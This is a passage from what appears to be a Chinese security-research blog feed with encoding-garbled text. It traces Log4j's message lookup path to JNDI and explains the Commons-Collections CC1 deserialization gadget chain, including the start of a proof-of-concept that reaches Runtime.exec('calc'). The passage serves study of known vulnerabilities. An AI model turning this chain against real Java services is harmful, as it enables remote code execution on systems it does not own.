this?</span></span><br><span class="line">        <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// æ£€æŸ¥workingBuilderä¸­æ˜¯å¦å­˜åœ¨$&#123;&#125;æ ¼å¼çš„å ä½ç¬¦</span></span><br><span class="line">                <span class="comment">// å¾—åˆ°iä¸º64</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// æå–offsetåˆ°ç»“å°¾çš„éƒ¨åˆ†ï¼Œç›¸å½“äºè·å–formatToåŠ ä¸Šå»çš„å†…å®¹</span></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// ä½¿ç”¨é…ç½®å¯¹è±¡ä¸­çš„StrSubstitutoræ›¿æ¢å ä½ç¬¦ä¸ºç›¸åº”çš„å€¼</span></span><br><span class="line">                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¦‚æœéœ€è¦æ¸²æŸ“ï¼Œåˆ™ä½¿ç”¨textRendererå¯¹workingBuilderè¿›è¡Œæ¸²æŸ“ï¼Œå¹¶å°†ç»“æœè¿½åŠ åˆ°toAppendToä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (doRender) &#123;</span><br><span class="line">            textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// åé¢å¯ä»¥å¿½ç•¥</span></span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">        String result;</span><br><span class="line">        <span class="comment">// å¦‚æœæ¶ˆæ¯å®ç°äº†MultiformatMessageæ¥å£ï¼Œè°ƒç”¨getFormattedMessageæ–¹æ³•è·å–æ ¼å¼åŒ–åçš„æ¶ˆæ¯</span></span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiformatMessage) &#123;</span><br><span class="line">            result = ((MultiformatMessage) msg).getFormattedMessage(formats);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = msg.getFormattedMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨configä¸­çš„StrSubstitutoræ›¿æ¢å ä½ç¬¦ä¸ºç›¸åº”çš„å€¼</span></span><br><span class="line">            toAppendTo.append(config != <span class="literal">null</span> &amp;&amp; result.contains(<span class="string">&quot;$&#123;&quot;</span>)</span><br><span class="line">                    ? config.getStrSubstitutor().replace(event, result) : result);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            toAppendTo.append(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840438808-eab97513-e5d7-496f-923a-cc22710cf6a4.png"></p><p>è¿™é‡Œçš„å…³é”®ç‚¹åœ¨äºforå¾ªç¯é‡Œä¸»è¦åˆ¤æ–­åœ¨workingBuilderä¸­æ˜¯å¦å­˜åœ¨${}æ ¼å¼çš„å ä½ç¬¦ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±è°ƒç”¨config.getStrSubstitutor().replace(event, value)æ–¹æ³•è¿›è¡Œæ›¿æ¢ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840743531-077c94ca-f8e0-4c70-8dba-fba759399d97.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840826689-a9df9f50-07d4-4e95-8c72-4edc3e917df0.png"></p><p>è¿™é‡Œä¼šå…ˆè¿›å…¥AbstractConfigurationç±»çš„getStrSubstitutoræ–¹æ³•ä¼šç›´æ¥è¿”å›StrSubstitutorå¯¹è±¡</p><p>æ‰€ä»¥è·Ÿè¿›è¿™ä¸ªç±»çš„replaceæ–¹æ³•é‡Œå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840909967-f218a5d6-a205-4dca-a45a-860e4c5d21d9.png"></p><p>åˆ›å»ºä¸€ä¸ªStringBuilderå¯¹è±¡bufï¼Œå¹¶å°†sourceä½œä¸ºåˆå§‹å†…å®¹ï¼Œè°ƒç”¨substituteæ–¹æ³•è¿›è¡Œæ›¿æ¢æ“ä½œï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œæ›¿æ¢ï¼Œåˆ™è¿”å›åŸå§‹çš„sourceå­—ç¬¦ä¸²ã€‚è·Ÿè¿›çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733840995137-9c65db36-86ac-440f-b774-0feff4d18e5b.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841064478-c5cde0dd-bf9a-486c-b474-baabe31bf11d.png"></p><p>çœ‹å…³é”®ç‚¹åœ¨è¿™ä¸ªwhileå¾ªç¯é‡Œï¼Œè¿™é‡Œæˆ‘ç›´æ¥å‚è€ƒsu18ä½¬å’Œå¸ˆå“¥çš„è§£é‡Š</p><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/13077">https://xz.aliyun.com/t/13077</a></p><p><a href="https://tttang.com/archive/1378/#toc_0x00">https://tttang.com/archive/1378/#toc_0x00</a></p><p>ç„¶åç»§ç»­è·Ÿåˆ°resolveVeriableæ–¹æ³•é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841298061-5c44f633-12ec-4ded-b3df-fbc393054431.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841355807-be708652-b470-4f01-8e85-4e1ee055dfc6.png">è¿™é‡Œä¼šæ‰ç”¨Interpolatorç±»çš„lookupæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841450543-9dfa583c-b13d-45d4-8b7a-1153710d20c5.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨jndiLookupç±»çš„lookupæ–¹æ³•ç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841488266-ebf37dee-7906-4624-8db1-96973cec007b.png"></p><p>ç„¶åä¼šè°ƒç”¨JndiManagerç±»çš„lookupæ–¹æ³•è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733841521882-9f02d719-2cd1-4ba8-98df-d92e30455aa4.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨InitialContextç±»çš„lookupæ–¹æ³•ä¹‹åå°±æ˜¯jndiçš„åˆ©ç”¨äº†</p><p>è¿™é‡Œå¼•ç”¨å¸ˆå“¥çš„æ€»ç»“</p><p>ä¸‰ä¸ªå…³é”®ç‚¹ï¼š</p><blockquote><ol><li>åœ¨PatternLayoutç±»çš„toSerializableæ–¹æ³•ä¸­ï¼Œè°ƒç”¨MessagePatternConverterçš„formatæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ ¼å¼åŒ–çš„è¿‡ç¨‹ï¼Œå°†æ ¼å¼åŒ–çš„å†…å®¹æ·»åŠ åˆ°workingBuilderä¸­ï¼Œä¹Ÿå°±æ˜¯å°†æºä»£ç ä¸­çš„messageæ›¿æ¢{}ï¼ŒåŒæ—¶åŒ¹é…å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨${}å ä½ç¬¦ï¼Œå¹¶ä½¿ç”¨config.getStrSubstitutor().replaceè¿›è¡Œæ›¿æ¢</li><li>åœ¨StrSubstitutorç±»çš„substituteæ–¹æ³•ä¸­ï¼Œæå–${}ä¸­çš„å†…å®¹ï¼Œå¹¶è°ƒç”¨StrSubstitutorç±»resolveVariableæ–¹æ³•å¯¹å…¶è§£æ</li><li>åœ¨Interpolatorç±»çš„lookupæ–¹æ³•ä¸­ï¼Œæ ¹æ®å‰ç¼€åœ¨mapä¸­è·å–å¯¹åº”çš„StrLookupå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶lookupæ–¹æ³•ï¼Œè¿™é‡Œçš„å‰ç¼€ä¸ºjndiï¼Œæ‰€ä»¥è·å–çš„æ˜¯JndiLookupå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶lookupæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†jndiManager.lookupæ–¹æ³•</li></ol></blockquote><h2 id="rc1"><a href="#rc1" class="headerlink" title="rc1"></a>rc1</h2><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/13077">https://xz.aliyun.com/t/13077</a></p><p><a href="https://tttang.com/archive/1378/">https://tttang.com/archive/1378</a>&#x2F;</p><p>å†™çš„å¾ˆè¯¦ç»†è‡ªå·±å°±ä¸è·Ÿäº†ç›´æ¥çœ‹åŸæ–‡æ›´å¥½</p><p>ä¸å‡ºç½‘çš„ä¸€äº›æ–¹å¼</p><p>å‚è€ƒï¼š<a href="https://cloud.tencent.com/developer/article/2036012">https://cloud.tencent.com/developer/article/2036012</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Log4j </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections1ååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Commons-Collections1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="TranformedMap"><a href="#TranformedMap" class="headerlink" title="TranformedMap"></a>TranformedMap</h2><p>å¤ä¹ ä¸€éä¹‹å‰å­¦è¿‡çš„ï¼Œç”±äºå¤ªè¿‡ä¹…è¿œå¯¼è‡´åŸºæœ¬å…¨éƒ¨å¿˜è®°äº†ï¼Œè¿˜æœ‰å°±æ˜¯å½“æ—¶çš„ç¬”è®°è®°å¾—å¤ªè¿‡äºæ½¦è‰å¯¼è‡´æ ¹æœ¬æ²¡æ³•å¤ä¹ ã€‚</p><p>è¿™æ¬¡é‡æ–°è·Ÿä¸€écc1é“¾ã€‚</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å…·ä½“æ­å»ºå¯ä»¥å‚è€ƒbilibiliçš„ç™½æ—¥æ¢¦ç»„é•¿ã€‚</p><p>å°±æ˜¯å°†ä¸‹è½½jdk  8u71ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œç„¶ååœ¨ä¸‹è½½å¯¹åº”çš„openjdkå°†é‡Œé¢çš„sunåŒ…å¤åˆ¶è¿‡æ¥ï¼Œç„¶åæ³¨æ„Commons-Collectionsçš„ç‰ˆæœ¬ä¸º3.2.1ã€‚</p><h3 id="å‡½æ•°ä»‹ç»"><a href="#å‡½æ•°ä»‹ç»" class="headerlink" title="å‡½æ•°ä»‹ç»"></a>å‡½æ•°ä»‹ç»</h3><h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p>Transformeræ˜¯ä¸€ä¸ªæ¥å£ï¼Œåªæœ‰ä¸€ä¸ªå¸¦å®ç°çš„æ–¹æ³•ï¼›<br>TransformedMapåœ¨è½¬æ¢Mapçš„æ–°å…ƒç´ æ—¶ï¼Œå°±ä¼šè°ƒâ½¤transformâ½…æ³•ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ç±»ä¼¼åœ¨è°ƒâ½¤â¼€ä¸ªâ€œå›è°ƒ<br>å‡½æ•°â€ï¼Œè¿™ä¸ªå›è°ƒçš„å‚æ•°æ˜¯åŸå§‹å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><font style="color:rgb(51, 51, 51);">InvokerTransformeræ˜¯å®ç°äº†Transformerã€Serializableæ¥â¼çš„â¼€ä¸ªç±»ï¼Œè¿™ä¸ªç±»å¯ä»¥â½¤æ¥æ‰§â¾ä»»æ„â½…æ³•ï¼Œè¿™ä¹Ÿæ˜¯ååº<br></font>åˆ—åŒ–èƒ½æ‰§â¾ä»»æ„ä»£ç çš„å…³é”®ï¼›</p><p>åœ¨å®ä¾‹åŒ–è¿™ä¸ªInvokerTransformeræ—¶ï¼Œéœ€è¦ä¼ â¼Šä¸‰ä¸ªå‚æ•°ï¼š</p><ul><li>ç¬¬â¼€ä¸ªå‚æ•°æ˜¯å¾…æ‰§â¾çš„â½…æ³•å</li><li>ç¬¬â¼†ä¸ªå‚æ•°æ˜¯è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹</li><li>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨</li></ul><p>åé¢transformæ–¹æ³•ï¼Œé€šè¿‡åå°„è°ƒç”¨æ‰§è¡Œäº†inputå¯¹è±¡çš„iMethodNameæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ChainedTransformeræ˜¯å®ç°äº†Transformerã€Serializableæ¥â¼çš„â¼€ä¸ªç±»ï¼Œå®ƒçš„ä½œâ½¤æ˜¯å°†å†…éƒ¨çš„å¤šä¸ªTransformerä¸²åœ¨â¼€èµ·ï¼Œå°†å‰ä¸€ä¸ªå›è°ƒè¿”å›çš„ç»“æœä½œä¸ºåä¸€ä¸ªçš„å‚æ•°ä¼ å…¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>ConstantTransformeræ˜¯å®ç°äº†Transformerã€Serializableæ¥å£çš„ä¸€ä¸ªç±»ï¼Œå®ƒçš„è¿‡ç¨‹å°±æ˜¯åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨transformæ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ï¼›</p><p>ä½œç”¨å°±æ˜¯åŒ…è£…ä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æ‰§è¡Œå›è°ƒæ—¶è¿”å›è¿™ä¸ªå¯¹è±¡ï¼Œè¿›è€Œæ–¹ä¾¿åç»­æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Transfomed"><a href="#Transfomed" class="headerlink" title="Transfomed"></a>Transfomed</h4><p>TransformedMapâ½¤äºå¯¹Javaæ ‡å‡†æ•°æ®ç»“æ„Mapåšâ¼€ä¸ªä¿®é¥°ï¼Œè¢«ä¿®é¥°è¿‡çš„Mapåœ¨æ·»åŠ æ–°çš„å…ƒç´ æ—¶ï¼Œå°†å¯ä»¥æ‰§â¾â¼€ä¸ªå›è°ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">putAll</span><span class="params">(Map mapToCopy)</span> &#123;</span><br><span class="line">        mapToCopy = transformMap(mapToCopy);</span><br><span class="line">        getMap().putAll(mapToCopy);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨é“¾è¿‡ç¨‹"><a href="#è°ƒç”¨é“¾è¿‡ç¨‹" class="headerlink" title="è°ƒç”¨é“¾è¿‡ç¨‹"></a>è°ƒç”¨é“¾è¿‡ç¨‹</h3><p>å…ˆæ¥çœ‹ä¸€ä¸‹Transfomedçš„poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //æ­£å¸¸è·å–runtimeå®ä¾‹</span></span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //åå°„è·å– runtimeå®ä¾‹,å¹¶æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);</span></span><br><span class="line"><span class="comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        execMethod.invoke(runtime,&quot;calc&quot;);</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//        //InvokerTransformeræ–¹æ³•è·å–runtimeå®ä¾‹ï¼Œå¹¶æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="comment">//        Method  getRuntimeMethod = (Method) new InvokerTransformer(&quot;getRuntime&quot;, new Class[]&#123;String.class, 